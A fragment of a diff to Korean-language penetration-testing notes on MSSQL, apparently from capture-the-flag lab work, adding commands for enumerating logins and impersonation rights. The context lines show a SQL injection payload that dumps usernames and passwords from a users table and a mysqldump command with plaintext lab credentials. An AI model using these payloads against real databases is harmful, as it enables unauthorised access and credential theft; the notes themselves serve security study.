@@ -215,8 +215,7 @@ mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
 <details>
   <summary><strong>MSSQL (Microsoft SQL Server)</strong></summary>
 
-Microsoft의 상용 관계형 데이터베이스 관리 시스템입니다.  
-**기본 포트**: 1433
+- `sysadmin` : 최고 권한.
 
 ### nxc login test
 - `--local-auth`를 붙여서 로그인 시도.
@@ -274,6 +273,15 @@ select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,90157825
 2> go
 
 SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
+```
+
+### MSSQL 내부 명령
+```mssql
+# MSSQL에 로그인 가능한 유저 확인
+enum_logins
+
+# IMPERSONATE 권한 확인
+enum_impersonate
 ```
 
 ---
